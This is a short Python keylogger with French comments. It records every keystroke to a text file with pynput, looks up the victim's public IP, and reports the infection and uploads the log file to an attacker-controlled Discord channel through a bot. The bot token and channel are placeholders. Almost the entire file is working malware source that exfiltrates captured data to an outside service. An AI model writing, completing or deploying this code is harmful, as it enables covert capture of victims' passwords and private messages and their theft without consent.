from pynput.keyboard import Listener
from discord.ext.commands import Bot
from requests import get
import logging
import discord



try:
    open("touch.txt", 'x')
except:
    pass
#création du bot discord
bot = Bot(command_prefix='!')
#récupération de l'IP de la victime à partir de l'API de ipify
ip = get('https://api.ipify.org').text

#Dés que le bot a fini de s'initier
@bot.event
async def on_ready():
    print('Connecté en tant que {0}!'.format(bot.get_user("your channel")))

    #On focus un channel dans un serveur discord
    channel = bot.get_channel("your channel")
    await channel.send('L\'IP : ' + ip + " a été infécté")
    await channel.send(file=discord.File('touch.txt'))
    file_to_key = "touch.txt"
    logging.basicConfig(filename=file_to_key, level=logging.DEBUG, format=ip + " %(asctime)s -> %(message)s")

    def on_press(key):
        logging.info(key)

    # définition d'un listener de key
    # à chaque nouvelle touche préssé on va aller chercher la fonction ci dessus qui va écrire dans le fichier txt
    with Listener(on_press=on_press) as listener:
        listener.join()
    #Keylogger(bot, channel)


#Token où le bot va s'initialiser
bot.run('your token')



